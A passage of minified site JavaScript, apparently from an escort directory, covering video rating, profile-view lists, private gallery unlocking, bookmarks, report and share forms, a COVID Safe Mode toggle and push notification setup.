class="profileVideoRateInfo content"><div class="txtWhite txtBold mrgBot">'+t.label+'</div><div class="txtGray">Rated ('+t.votes+")</div></div>"}function rateVideo(e,t){pageLoader("show"),$.ajax({type:"POST",url:"/male-escort-videos/ajax",cache:!1,data:{action:"rateVideo",videoID:e,value:t},error:function(){pageLoader("hide")},success:function(t){pageLoader("hide");var a=$.parseJSON(t);1==a.success?playVideo(e):1==a.reason?toggleConfirm({text:a.message,buttons:{confirmLabel:translate("common-signup"),cancelLabel:translate("login-login")}},(function(){window.location="/register/"}),(function(){$("#confirm .confirm-buttons .cancel").unbind().on("click",(function(){window.location="/login/"}))})):toggleAlert(a.message)}})}function getWhoSawMe(e){var t,a;(void 0===e||e<1)&&(e=1),$("#whoSawMeContainer").length>0?(t=$("#whoSawMeContainer"),a="action=whoSawMe&page="+e):$("#whoDidISeeContainer").length>0&&(t=$("#whoDidISeeContainer"),a="action=whoDidISee&page="+e),pageLoader("show"),$.ajax({type:"POST",url:"/whosawme/ajax",cache:!1,data:a,success:function(e){pageLoader("hide");var a=$.parseJSON(e);if(1==a.success){var i="";$.each(a.users,(function(e,t){i+=getWhoSawMePattern(t)})),t.html(i)}else t.html('<div class="alertBox light blue">'+a.message+"</div>");setPagination({container:"#paginationContainer",page:a.page,next:a.nextPage,prev:a.prevPage,totalPages:a.totalPages,buttons:{nextCallback:function(e){getWhoSawMe(e)},prevCallback:function(e){getWhoSawMe(e)}},pageSelect:{callback:function(e){getWhoSawMe(e)}}}),$("#whoSawMeContainer").length>0?animateScrollTo("#whoSawMeContainer"):$("#whoDidISeeContainer").length>0&&animateScrollTo("#whoDidISeeContainer")}})}function getWhoSawMePattern(e){var t="";return t=1==e.is_available?'<div class="profilesStatus online mrgTop2"><span class="left">'+translate("common-availablenow")+'</span><div class="overflowHidden"></div></div>':2==e.is_available?'<div class="profilesStatus notavailable mrgTop2"><span class="left">'+translate("common-notavailable")+'</span><div class="overflowHidden"></div></div>':1==e.is_online?'<div class="profilesStatus online mrgTop2"><span class="left">'+translate("common-onlinenow")+'</span><div class="overflowHidden"></div></div>':'<div class="profilesStatus ofline mrgTop2"><span class="left">'+translate("common-laston")+": "+e.last_online+'</span><div class="overflowHidden"></div></div>','<li><div class="profileBox"><div class="whoSawMe-remove" onclick="markActivity('+e.activity_id+');" title="Remove">x</div><div class="photo-big-tall relative"><div class="profileBox-info"><div class="txtUppercase txtBold mrgLeft2">'+e.username+'</div><div class="txtUppercase mrgLeft2">'+e.location+"</div>"+t+'</div><a href="'+e.profile_url+'"><div class="img-cover full-width" style="background-image: url('+e.photo+');"></div></a></div></div></li>'}function markActivity(e){pageLoader("show"),$.ajax({type:"POST",url:"/whosawme/ajax",cache:!1,data:{action:"markAsDeleted",activity_id:e},success:function(e){pageLoader("hide"),getWhoSawMe()}})}function savePrivateGalleryCode(){var e=$("#privateGalleryCodeInput").val(),t="action=setPrivateGalleryCode&unlockCode="+encodeURIComponent(e);pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:t,success:function(t){pageLoader("hide");var a=$.parseJSON(t);1==a.success&&$(".private-gallery-code-js").text(e),toggleAlert(a.message)}})}function privateGalleryRequest(e){var t={action:"privateGalleryRequest",userID:e,text:$("#requestText").val(),senderEmail:$("#senderEmail").val(),senderEmailRe:$("#senderEmailRe").val()};pageLoader("show"),$.ajax({type:"POST",url:"/profile/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?toggleConfirm({text:t.message,buttons:{cancelClass:"invisible",confirmLabel:"OK"}},(function(){window.location.reload()})):toggleAlert(t.message)}})}function unlockPrivateGallery(e){var t="action=privateGalleryUnlock&userID="+e+"&unlockCode="+encodeURIComponent($("#galleryPassword").val());pageLoader("show"),$.ajax({type:"POST",url:"/profile/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?window.location.reload():toggleAlert(t.message)}})}function unlockMobilePrivateGallery(e){var t="action=privateGalleryUnlock&userID="+e+"&unlockCode="+encodeURIComponent($("#mobileGalleryPassword").val());pageLoader("show"),$.ajax({type:"POST",url:"/profile/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?($("html,body").animate({scrollTop:top-65}),window.location.reload()):toggleAlert(t.message)}})}function privateMobileGalleryRequest(e){var t={action:"privateGalleryRequest",userID:e,text:$("#requestMobileText").val(),senderEmail:$("#senderMobileEmail").val(),senderEmailRe:$("#senderMobileEmailRe").val()};pageLoader("show"),$.ajax({type:"POST",url:"/profile/ajax",cache:!1,data:t,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?toggleConfirm({text:t.message,buttons:{cancelClass:"invisible",confirmLabel:"OK"}},(function(){window.location.reload()})):toggleAlert(t.message)}})}function mediaPlayer(e){switch(e){case"private":$("#media-public .media-gallery, #media-video .media-gallery").hide("slow"),$("#media-private .media-gallery").show("slow",(function(){animateScrollTo("#media-private")}));break;case"public":$("#media-private .media-gallery, #media-video .media-gallery").hide("slow"),$("#media-public .media-gallery").show("slow");break;case"video":$("#media-public .media-gallery, #media-private .media-gallery").hide("slow"),$("#media-video .media-gallery").show("slow")}}function galleryPagination(e,t){var a=$("#media-"+e),o=a.find(".media-thumbs-container"),n=a.find(".media-thumbs-slider"),s=a.find(".media-thumb"),r=0,l=0,c=o.outerWidth(),d=$("#media-"+e+" .arrows-small");if(!d.hasClass("disabled")&&($.each(s,(function(){if(currentWidth=$(this).outerWidth(!0),r+currentWidth>c)return!1;r+=currentWidth,l++})),l!=s.length))if(d.addClass("disabled"),"prev"==t){for(i=0;i<l;i++)tmpContents=$("#media-"+e+" .media-thumb"),tmpContents.last().insertBefore(tmpContents.first());n.css("left","-"+r+"px"),n.animate({left:"0px"},850,(function(){$("#media-"+e+" .media-thumb").first().click(),d.removeClass("disabled")}))}else n.stop().animate({left:"-"+r+"px"},850,(function(){for(i=0;i<l;i++)tmpContents=$("#media-"+e+" .media-thumb"),tmpContents.first().css("display","none").insertAfter(tmpContents.last()).fadeIn();n.css("left","0px"),$("#media-"+e+" .media-thumb").first().click(),d.removeClass("disabled")}))}function loadPrivateGallery(e){var t=isMobile?"window.scrollTo(0, 1);":"",a=isMobile?"photoSwipeP":"fancyboxP",i=$("#media-private .media-thumbs-container div"),o=$("#media-private .media-gallery");i.empty(),o.empty(),$.each(e,(function(e,n){i.append('<img src="'+n.photo_thumb+'" class="media-thumb" onclick="showGalleryPhoto(\'private\', '+n.photo_id+');"  />'),o.append('<a href="'+n.photo_main+'" rel="privateGallery" class="'+a+'" onclick="'+t+'" id="privatePhoto-'+n.photo_id+'"></a>')})),$("#media-private .media-thumb").first().click(),isMobile?loadPhotoSwipe(".photoSwipeP"):loadFancyBox(".fancyboxP")}function showGalleryPhoto(e,t){var a,i=$("#"+e+"Photo-"+t),o=$("#media-"+e),n=o.find(".media-gallery"),s=o.find(".media-gallery-loader"),r=0;s.fadeIn();var l=function(t,a){void 0===a&&(a=0),void 0!==t[a]?(current=$(t[a]),current.html('<img style="display:none;" src="'+current.attr("href")+'" />').find("img").unbind("load").load((function(){$(this).css({display:"block",opacity:0,height:"285px"}).animate({height:"380px",opacity:1},300,(function(){r=0,$.each(n.find("img"),(function(){r+=$(this).outerWidth(!0)})),r<$("#media-"+e).width()?l(t,a+1):s.fadeOut()}))}))):s.fadeOut()};a=i.add(i.nextAll(":lt(4)")),n.find("img").length>0?n.find("img").stop().fadeOut("fast",(function(){$(this).remove(),l(a)})):l(a)}var bookmarksPage=1;function getBookmarks(e,t){var a,i;if(void 0===e&&(e=1),e<1&&(e=1),bookmarksPage=e,"object"==typeof bookmarksXHR&&(bookmarksXHR.abort(),bookmarksXHR=null),$("#wishListContainer").length>0)a=$("#wishListContainer"),i="action=getWishlist&page="+e+"&location_id="+$("#wishlistLocationSearch").val();else{if(!($("#bookmarksContainer").length>0))return;a=$("#bookmarksContainer"),i="action=getBookmarks&page="+e}pageLoader("show"),bookmarksXHR=$.ajax({type:"GET",url:"/bookmarks/ajax",cache:!1,data:i,success:function(i){pageLoader("hide");var o=$.parseJSON(i);if(1==o.success){var n="";$.each(o.users,(function(e,t){n+=bookmarksPattern(t)})),a.html(n),history.replaceState({},"",window.location.pathname+"?page="+e)}else a.html('<div class="alertBox light blue">'+o.message+"</div>");setPagination({container:"#paginationContainer",page:o.page,next:o.nextPage,prev:o.prevPage,totalPages:o.totalPages,buttons:{nextCallback:function(e){getBookmarks(e,!0)},prevCallback:function(e){getBookmarks(e,!0)}},pageSelect:{callback:function(e){getBookmarks(e,!0)}}}),void 0!==t&&animateScroll(0)}})}function bookmarksPattern(e){var t="";return t=1==e.is_available?'<div class="profilesStatus online mrgTop2"><span class="left">'+translate("common-availablenow")+'</span><div class="overflowHidden"></div></div>':2==e.is_available?'<div class="profilesStatus notavailable mrgTop2"><span class="left">'+translate("common-notavailable")+'</span><div class="overflowHidden"></div></div>':1==e.is_online?'<div class="profilesStatus online mrgTop2"><span class="left">'+translate("common-onlinenow")+'</span><div class="overflowHidden"></div></div>':'<div class="profilesStatus ofline mrgTop2"><span class="left">'+translate("common-laston")+": "+e.lastOnline+'</span><div class="overflowHidden"></div></div>',e.travels.length>0&&$.each(e.travels,(function(e,t){'<div class="loc">'+t.city+" - "+t.period+"</div>"})),'<li><div class="profileBox"><div onclick="bookmarkActions(\'removeConfirm\', '+e.user_id+');" class="whoSawMe-remove">x</div><div class="photo-big-tall full-width relative" style="width: 100%;"><div class="profileBox-info"><div class="txtUppercase txtBold mrgLeft2">'+e.username+'</div><div class="txtUppercase mrgLeft2">'+e.location+"</div>"+t+'</div><a href="'+e.profile_url+'"><div class="img-cover full-width" style="background-image: url('+e.photo+');"></div></a></div><div class="bookmarkTxt" onclick="bookmarkActions(\'editNotesPopUp\', '+e.user_id+');"><div class="pad" id="notes'+e.user_id+'">'+e.description+'</div></div><div class="bookmark-control"><div class="pad"><a href="/'+e.username+'/" class="split2 inlineBlock block" title="Go to '+e.username+'\'s profile"><div class="bookmark-profile mrgAuto txtCenter"></div></a><div class="split2 inlineBlock pointer" onclick="profileActions(\'getEmail\', '+e.user_id+');" title="Send '+e.username+' an email"><div class="bookmark-mail"></div></div></div></div></div></li>'}function bookmarkActions(e,t){var a,i=null;switch(e){case"removeConfirm":return void toggleConfirm({title:translate("common-userlist"),text:translate("common-doyoureallywanttoremove"),buttons:{confirmLabel:translate("common-remove")}},(function(){bookmarkActions("remove",t)}));case"remove":i=function(e){toggleAlert(e.message),getBookmarks(bookmarksPage)},a="action=remove&userID="+t;break;case"addConfirm":return void toggleConfirm({title:translate("common-adduser"),text:"<div>"+translate("common-leaveacomment")+':</div><input type="text" class="input" maxlength="255" id="bookmarkComment" />',buttons:{confirmLabel:translate("common-add")}},(function(){bookmarkActions("add",t)}));case"add":i=function(e){pageLoader("show"),$("#settingsPage.settings-wishlist").length>0||$("#settingsPage.settings-bookmarks").length>0?getBookmarks(bookmarksPage):$("#profilePage").length&&$("#bookmarkUserBox").remove(),window.location.reload()},a="action=add&userID="+t+"&comment="+encodeURIComponent($("#bookmarkComment").val());break;case"editNotesPopUp":var o=$("#notes"+t).text();return void toggleConfirm({title:translate("common-editbuddynotes"),text:'<textarea onkeyup="countChars(this, 250);" id="buddyNotesInput" class="input" rows="5">'+o+"</textarea>",buttons:{confirmLabel:translate("common-save")}},(function(){bookmarkActions("saveBuddyNotes",t)}));case"saveBuddyNotes":a="action=saveBuddyNotes&userID="+t+"&notes="+encodeURIComponent($("#buddyNotesInput").val());var n=$("#buddyNotesInput").val();i=function(){$("#notes"+t).text(n)};break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/bookmarks/ajax",cache:!1,data:a,success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?"function"==typeof i&&i(t):toggleAlert(t.message)}})}function reportProfile(e,t,a){var i=new Date;if($(window).width()<800){var o='<form id="sendEmailForm" action="" method="post" class="txtLeft content"><input type="hidden" name="reportedUserID" value="'+e+'"><p class="txtWhite">'+translate("common-pleasedescribewhyyouthink")+"</p>"+(0==a?'<div><div class="mrgTop txtGray9">Your Email:</div><input class="input" type="text" name="reporterEmail" id="reporterEmail" onkeyup="countChars(this, 100);"><div class="inputError"></div><div class="clear"></div></div>':"")+'<div><div class="mrgBot mrgTop2">'+translate("common-emailtext")+':</div><textarea rows="5" class="input" name="emailMessage" id="emailMessage"></textarea><div class="inputError"></div><div class="clear"></div></div><div class="'+(0==a?"mrgTop2":"invisible")+'"><div class="split2 floatLeft"><img src="/profile/captcha?q='+i.getTime()+'" class="captchaImage mrgTop" style="border:1px solid #333;"/></div><div class="split2 floatLeft"><input class="input" type="text" name="emailCaptcha" id="emailCaptcha" placeholder="'+translate("common-enterthecode")+'" maxlength="5" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div></div><div class="clear"></div></div></form><div class="content"><div class="button mrgTop2" onclick="sendEmail(1, \'sendReportEmail\');">'+translate("common-sendreport")+"</div><p class=\"txtPink pointer txtCenter button\" onclick=\"$('#reportProfile-js').html('');animateScrollTo('#profilePage');\">"+translate("common-cancel")+"</p></div>";$("#reportProfile-js").html(o),animateScrollTo("#reportProfile-js")}else{toggleConfirm({title:translate("common-reportusernameprofile",{username:t}),text:'<form id="sendEmailForm" action="" method="post" class="txtLeft"><input type="hidden" name="reportedUserID" value="'+e+'"><p class="txtWhite">'+translate("common-pleasedescribewhyyouthink")+"</p>"+(0==a?'<div><div class="mrgTop txtGray9">Your Email:</div><input class="input" type="text" name="reporterEmail" id="reporterEmail" onkeyup="countChars(this, 100);"><div class="inputError"></div><div class="clear"></div></div>':"")+'<div><div class="mrgBot mrgTop2">'+translate("common-emailtext")+':</div><textarea rows="5" class="input" name="emailMessage" id="emailMessage"></textarea><div class="inputError"></div><div class="clear"></div></div><div class="'+(0==a?"mrgTop2":"invisible")+'"><div class="split2 floatLeft"><img src="/profile/captcha?q='+i.getTime()+'" class="captchaImage mrgTop" style="border:1px solid #333;"/></div><div class="split2 floatLeft"><input class="input" type="text" name="emailCaptcha" id="emailCaptcha" placeholder="'+translate("common-enterthecode")+'" maxlength="5" onfocus="inputValidStatus(this, 1);" /><div class="inputError"></div></div><div class="clear"></div></div></form>',buttons:{confirmLabel:translate("common-sendreport"),cancelClass:"invisible",confirmClass:"visible pink button"},stay:!0},(function(){sendEmail(1,"sendReportEmail",(function(){resetEmailForm(),toggleConfirm()}))}))}}function leftColumnResizer(){var e,t=$("#col_left").height(),a=$("#col_right").height(),i=$("#col_left").find("> .grayBox:last"),o=i.height();e=t<a?a-t+o:a-(t-o),i.css("min-height",e)}function subscribeEmail(){pageLoader("show"),$.ajax({type:"POST",url:"/ajax/subscribe",cache:!1,data:"email="+encodeURIComponent($("#subscribeEmail").val()),success:function(e){pageLoader("hide"),toggleAlert($.parseJSON(e).message),$("#subscribeEmail").val("")}})}function sendEmail(e,t,a){if(void 0!==e&&void 0!==t){var i="action="+t+"&userID="+e+"&"+$("#sendEmailForm").serialize();pageLoader("show"),$.ajax({type:"POST",url:"/profile/ajax",cache:!1,data:i,success:function(e){pageLoader("hide");var t=$.parseJSON(e);0==t.success?(validateInfo(t.elements),reloadImage($("#sendEmailForm .captchaImage"))):"function"==typeof a&&a(),toggleAlert(t.message)}})}}function resetEmailForm(){var e=$("#sendEmailForm");e.find("input,textarea").val(""),reloadImage(e.find(".captchaImage")),inputValidStatus(e.find("input,textarea"),1)}function setContactUsEmailForm(e){var t=$("#contactUsEmailFormContainer"),a=getEmailFormPattern(e)+'<div class="clear"><a href="javascript:void(0);" class="button pink visible" id="sendContactButton">'+translate("common-sendemail")+"</a></div>";t.html(a),$("#sendContactButton").unbind().click((function(){sendEmail(1,"sendEmail",(function(){resetEmailForm()}))}))}var shareEmailData={patternID:0,profileID:0,link:""};function shareViaEmailPopup(e,t,a){var i,o;shareEmailData.patternID=t,shareEmailData.link=$("#"+e).val(),shareEmailData.profileID=a,o="action=openPopup&"+$.param(shareEmailData),i=function(e){if(1==e.success)if($(window).width()<800){toggleConfirm();var t='<form id="shareViaEmail" class="txtLeft">'+translate("common-yourname")+'*: <input type="text" name="senderName" class="input mrgBot2" />'+translate("common-recipientname")+'*: <input type="text" name="receiverName" class="input mrgBot2" />'+translate("common-recipientemail")+'*: <input type="email" name="receiverEmail" class="input mrgBot2" />'+translate("common-emailrecipientagain")+'*: <input type="email" name="receiverEmailRe" class="input mrgBot2" />Message: <div class="input content txtCenter">'+e.pattern.message+'</div></form><div class="button mrgTop2 red" onclick="shareViaEmail();">Send Mail</div><p class="txtRed pointer txtCenter txtUnderline" onclick="$(\'#shareContent\').html(\'\');animateScrollTo(\'#shareContent\');">Cancel</p>';$("#shareContent").html(t),animateScrollTo("#shareContent")}else{toggleConfirm({stay:!0,title:translate("common-sharebyemail"),text:'<form id="shareViaEmail" class="txtLeft">'+translate("common-yourname")+'*: <input type="text" name="senderName" class="input mrgBot2" />'+translate("common-recipientname")+'*: <input type="text" name="receiverName" class="input mrgBot2" />'+translate("common-recipientemail")+'*: <input type="email" name="receiverEmail" class="input mrgBot2" />'+translate("common-emailrecipientagain")+'*: <input type="email" name="receiverEmailRe" class="input mrgBot2" />Message: <div class="input content txtCenter">'+e.pattern.message+"</div></form>",buttons:{confirmLabel:translate("common-sendemail")}},(function(){shareViaEmail()}))}else toggleAlert(e.message)},pageLoader("show"),$.ajax({type:"GET",url:"/ajax/shareViaEmail",cache:!1,data:o,success:function(e){pageLoader("hide");var t=$.parseJSON(e);i(t)}})}function shareViaEmail(){var e,t;e="action=sendEmail&"+$("#shareViaEmail").serialize()+"&"+$.param(shareEmailData),t=function(e){1==e.success&&toggleConfirm(),toggleAlert(e.message)},pageLoader("show"),$.ajax({type:"GET",url:"/ajax/shareViaEmail",cache:!1,data:e,success:function(e){pageLoader("hide");var a=$.parseJSON(e);t(a)}})}function shareProfile(e,t){toggleConfirm({stay:!0,title:translate("profile-shareprofile"),text:'<div class="mrgBot4"><input id="shareProfileLink" type="text" class="input" value="https://'+window.location.hostname+"/"+e+'/" /></div><div class="displayTable txtCenter txtBold txtGray"><div class="displayTableRow profileSocialIconsA"><div class="displayTableCell split2"><a class="block button pink mrgRight2" href="javascript:void(0);" onclick="shareViaEmailPopup(\'shareProfileLink\', 33, '+t+')"><span class="socialIcons-contact"></span> '+translate("profile-shareprofile")+'</a></div><div class="displayTableCell split2"><a class="block button pink" href="http://twitter.com/home?status=Check out this TS4Rent profile https://'+window.location.hostname+"/"+e+'" onclick="javascript:window.open(this.href, \'\', \'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=600,width=600\');return false;"><span class="socialIcons-twitter"></span> Tweet</a></div></div></div>',buttons:{confirmClass:"invisible",cancelClass:"invisible"}},(function(){}),(function(){loadZclip({target:$("#shareProfileLink"),text:$("#shareProfileLink").val()})}))}function tempPopUp(){toggleConfirm({title:translate("common-temppopuptitle"),text:'<strong class="txtWhite">'+translate("common-websiteiscurrentlyfree")+"</strong> "+translate("common-untiltheneverything")+'<p class="txtCenter txtWhite txtBold">'+translate("common-youcannow")+"</p>",buttons:{confirmLabel:translate("common-ok"),cancelClass:"invisible"}},(function(){}))}function freeAdvertiseBday(e){toggleConfirm({title:"Advertise Here",text:{bDay:"In order to be <strong class=\"txtWhite\">TS Of The Day</strong> send an email to webmaster! In the 'Subject' field please enter: I'd like to be TS Of The Day",sponsors:"In order to be <strong class=\"txtWhite\">TS4Rent Sponsor</strong> send an email to webmaster! In the 'Subject' field please enter: I'd like to be TS4Rent Sponsor",coverGirl:"In order to be <strong class=\"txtWhite\">TS4Rent Cover Girl</strong> send an email to webmaster! In the 'Subject' field please enter: I'd like to be TS4Rent Cover Girl"}[e]+'<div class="sep"></div><form id="sendEmailForm" action="" method="post" class="txtLeft mrgTop3"><div><div class="mrgTop mrgBot">Email Subject:</div><input class="input mrgBot2" type="text" name="emailSubject" id="emailSubject" onkeyup="countChars(this, 100);"><div class="inputError"></div><div class="clear"></div></div><div><div class="mrgBot">Email Text:</div><textarea rows="5" class="input mrgBot2" name="emailMessage" id="emailMessage"></textarea><div class="inputError"></div><div class="clear"></div></div></form>',buttons:{confirmLabel:"Send Email",cancelClass:"invisible"},stay:!0},(function(){sendEmail(1,"sendEmail",(function(){resetEmailForm(),$("#confirm").remove()}))}))}function twitterAuth(){pageLoader("show"),$.ajax({type:"GET",url:"/twitter/authorization",cache:!1,data:"",success:function(e){pageLoader("hide");var t=$.parseJSON(e);0==t.success?toggleAlert(t.message):window.location=t.authURL}})}function getSMSLink(e,t){var a=navigator.userAgent,i="",o="?",n="sms:";if(/Android/gi.test(a)?i="android":/ip(od|ad|hone)/gi.test(a)&&(i="ios"),"ios"==i){var s=/OS (\d+)_/gi.exec(a);o=(void 0!==s[1]?parseInt(s[1]):6)>=8?"&":";"}return void 0!==t&&(n+=t),void 0!==e&&(n+=o+"body="+e),n}function comingSoon(){toggleConfirm({title:"TS4Rent",text:translate("common-thisfeatureiscomingsoon"),buttons:{confirmLabel:"OK",cancelClass:"invisible"}},(function(){}))}function loginToWatch(){var e='<div id="alert"><div class="alert-box"><div class="alert-title">TS4Rent<div class="right popup-close" onclick="$(\'#alert\').remove();">X</div></div><div class="alert-content">'+translate("common-inordertoseethisvideo")+'</div><div class="alert-buttons mrgBot3 clear"><div class="split2 left"><div class="mrgRight2"><a href="javascript:void(0);" class="pink button visible sign-up-js mrgAuto" style="width:130px;">'+translate("common-signup")+'</a></div></div><div class="split2 left"><a href="javascript:void(0);" class="pink button visible login-js mrgAuto" style="width:130px;">'+translate("login-login")+'</a></div></div></div><div id="popup-dimmer" onclick="$(\'#alert\').remove();"></div></div>';$("body").append(e),$("#alert").fadeIn(),centerAlert(),$("#alert a.sign-up-js").unbind().on("click",(function(e){e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),window.location="/register"})),$("#alert a.login-js").unbind().on("click",(function(e){e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),window.location="/login"}))}function handleVideoClick(){$.each($(".video-play-js"),(function(e,t){var a=$(this).attr("data-username"),i=$(this).attr("data-videoid");$(this).unbind().click((function(){$(window).width()<800?isLogged?window.location="/ts-escort-videos/play/"+i:loginToWatch():window.location="/"+a+"/#video-"+i}))}))}function generateInvitationCodeCode(){pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:"action=generateInvitationCode",success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?toggleConfirm({title:"TS4Rent!",text:t.message,buttons:{confirmLabel:"OK",cancelClass:"invisible"}},(function(){pageLoader("show"),window.location.reload()})):toggleConfirm({title:"TS4Rent!",text:t.message,buttons:{confirmLabel:"OK",cancelClass:"invisible"}},(function(){pageLoader("show"),window.location.reload()}))}})}function generateRewardCode(){pageLoader("show"),$.ajax({type:"POST",url:"/settings/ajax",cache:!1,data:"action=generateRewardCode",success:function(e){pageLoader("hide");var t=$.parseJSON(e);1==t.success?toggleConfirm({title:"TS4Rent!",text:t.message,buttons:{confirmLabel:"OK",cancelClass:"invisible"}},(function(){pageLoader("show"),window.location.reload()})):toggleConfirm({title:"TS4Rent!",text:t.message,buttons:{confirmLabel:"OK",cancelClass:"invisible"}},(function(){pageLoader("show"),window.location.reload()}))}})}function homeSpecialAdsSlider(e){var t=$(".spsContainer-js"),a=t.width(),i=t.find(e);t.find(".slide-js-ad").css({width:a});var o=i.find(".slide-js-ad").first(),n=i.find(".slide-js-ad").last();i.animate({left:"-"+o.outerWidth(!0)+"px"},450,(function(){o.insertAfter(n),i.css("left",0)}))}function rotateSponsorsMobile(e){var t=$(".spsContainer-mobile-js"),a=t.width(),i=t.find(e);t.find(".slide-js-mobile-ad").css({width:a});var o=i.find(".slide-js-mobile-ad").first(),n=i.find(".slide-js-mobile-ad").last();i.animate({left:"-"+o.outerWidth(!0)+"px"},450,(function(){o.insertAfter(n),i.css("left",0)}))}function tsLiveCams(e){toggleConfirm({title:"TS4Rent",text:translate("common-youwillbeforwarded"),buttons:{cancelLabel:translate("common-cancel"),confirmLabel:translate("common-forward")}},(function(){window.open(e)}))}function showPhotoVerification(){toggleConfirm({title:translate("nav-photoverification"),text:'<div class="mrgAuto txtCenter"><div class="txtWhite mrgBot2">'+translate("verification-yourverificationshouldlook")+'</div><img src="/public/images/main/common/verificationPhotoNew.jpg" class="verification-photo-ex" /></div>',buttons:{confirmLabel:"OK",cancelClass:"invisible"}},(function(){}))}var covidFooter={hide:function(){setCookie("covidFooterHide",1,365),$("#covidFooter").remove()},check:function(){getCookie("covidFooterHide")&&$("#covidFooter").remove()}};function prebookingActions(e){var t=null,a="action="+e;switch(e){case"prebookingOnConfirm":return void toggleConfirm({title:"COVID Safe Mode",text:'<div class="txtWhite">You are about to activate COVID Safe Mode.</div>\n\t\t\t\t\t\t\t<p class="pointer txtBold" onclick="$(\'#freezeExpandContent, #freezeMore\').toggleClass(\'active\'); centerPosition(\'.confirm-box\', \'fixed\');">\n\t\t\t\t\t\t\t\t<span id="freezeMore">\n\t\t\t\t\t\t\t\t\t<span class="freezeMore"><span class="txtPink txtBold">Learn more</span> <span class="warningIcon"></span></span>\n\t\t\t\t\t\t\t\t\t<span class="freezeLess"><span class="txtPink txtBold">Learn less</span></span>\n\t\t\t\t\t\t\t\t</span>\n\t\t\t\t\t\t\t</p>\n\t\t\t\t\t\t\t<div id="freezeExpandContent" class="freezePopContent txtGrayC">'+(1==userType?'<p>\n\t\t\t\t\t\t\t\t\tDuring the COVID-19 pandemic, we provide you the option to set your profile in Safe Mode. This way, you will show to other \n                                    users that you may accept future bookings or offer online services, while at the same time, you prefer not to meet people in \n                                    person at the moment. A discrete icon will appear on your profile, informing the users for your preferences. Safe Mode does \n                                    not indicate any health status. And finally, we would like to remind you that the best thing you can do is to stay safe at home.\n\n\t\t\t\t\t\t\t\t</p>\n\t\t\t\t\t\t\t\t<p>\n\t\t\t\t\t\t\t\t\tImportant: While COVID Safe Mode is active, you will not be able to freeze your membership.\n\t\t\t\t\t\t\t\t</p>\n\t\t\t\t\t\t\t\t<p>\n\t\t\t\t\t\t\t\t\tIf you have any questions, doubts, or need assistance, please contact the \n\t\t\t\t\t\t\t\t\t<a href="/about/contact" class="txtWhite">\n\t\t\t\t\t\t\t\t\t\t<span class="txtBold">Webmaster</span>\n\t\t\t\t\t\t\t\t\t</a>\n\t\t\t\t\t\t\t\t</p>':"<p>\n\t\t\t\t\t\t\t\t\tCOVID Safe Mode is a feature that you can set for your profile to show to other users that you prefer not to meet people in \n                                    person at the moment. It can be useful, if you’re interested only in future bookings, or looking for online services (such \n                                    as videos, phone calls, or other remote service). You can activate this feature from the Account tab in your Dashboard. A \n                                    discrete icon will appear on your profile, informing the users for your preferences. Safe Mode does not indicate any health status.\n\t\t\t\t\t\t\t\t</p>")+"\t\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t",buttons:{confirmLabel:"Activate",cancelLabel:translate("common-cancel")}},(function(){prebookingActions("prebookingOn")}));case"prebookingOffConfirm":return void toggleConfirm({title:"COVID Safe Mode",text:"Would you like to deactivate COVID Safe Mode?",buttons:{confirmLabel:"Deactivate",cancelLabel:translate("common-cancel")}},(function(){prebookingActions("prebookingOff")}));case"prebookingOn":case"prebookingOff":t=function(e){toggleConfirm({title:e.title?e.title:"TS4Rent",text:'<div class="txtCenter">'+e.message+"</div>",buttons:{cancelClass:"invisible",confirmLabel:"Ok"}},(function(){$("#prebookingSwitch").toggleClass("off"),window.location.reload()}),(function(){$("#confirm .cancel").unbind().on("click",(function(){toggleConfirm(),window.location.reload()}))}))};break;default:return}pageLoader("show"),$.ajax({type:"POST",url:"/account/ajax",cache:!1,data:a,error:function(){pageLoader("hide")},success:function(e){pageLoader("hide");var a=$.parseJSON(e);"function"==typeof t&&t(a)}})}var wp={config:null,notify:{available:"Notification"in window,permission:null,checkPermission:function(e){if(!wp.notify.available)return"function"==typeof e&&e(!1),!1;var t=Notification.permission;"function"==typeof e&&e(t)},init:function(e){if(!wp.notify.available)return"function"==typeof e&&e(!1),!1;Notification.requestPermission((function(t){"function"==typeof e&&e(t)}))},show:function(e){if(!wp.notify.available||"granted"!=Notification.permission)return!1;var t={title:"Notification Title",text:"Notification Message",icon:null};t=$.extend({},t,e);new Notification(t.title,{body:t.text,icon:t.icon})}},apns:{available:"safari"in window&&"pushNotification"in window.safari,permission:null,checkPermission:function(e,t){if(!wp.apns.available)return"function"==typeof t&&t({permission:!1}),!1;var a=window.safari.pushNotification.permission(e);"function"==typeof t&&t(a)},init:function(e){var t={pushID:null,restApi:null,callback:null,userData:{}};if(t=$.extend({},t,e),!wp.apns.available)return"function"==typeof t.callback&&t.callback({permission:!1}),!1;try{window.safari.pushNotification.requestPermission(t.restApi,t.pushID,t.userData,(function(e){"function"==typeof t.callback&&t.callback(e)}))}catch(e){if("Push notification prompting can only be done from a user gesture."==e){var a=window.safari.pushNotification.permission(wp.config.apns_push_id);a.deviceToken&&$.ajax({type:"post",url:"/notifications/apns/v2/devices/",data:{pushID:wp.config.apns_push_id,deviceToken:a.deviceToken},success:e=>{}})}}}},urlBase64ToUint8Array:function(e){for(var t=(e+"=".repeat((4-e.length%4)%4)).replace(/\-/g,"+").replace(/_/g,"/"),a=window.atob(t),i=new Uint8Array(a.length),o=0;o<a.length;++o)i[o]=a.charCodeAt(o);return i},sw:{available:null,permission:null,message:null,checkPermission:function(e,t){return"serviceWorker"in navigator?"PushManager"in window?"showNotification"in ServiceWorkerRegistration.prototype?"denied"===Notification.permission?(t({permission:"denied",supported:1,message:"ServiceWorker Notification Permission Denied - Check your browser settings!"}),!1):void navigator.serviceWorker.getRegistration(e).then((function(e){e?"pushManager"in 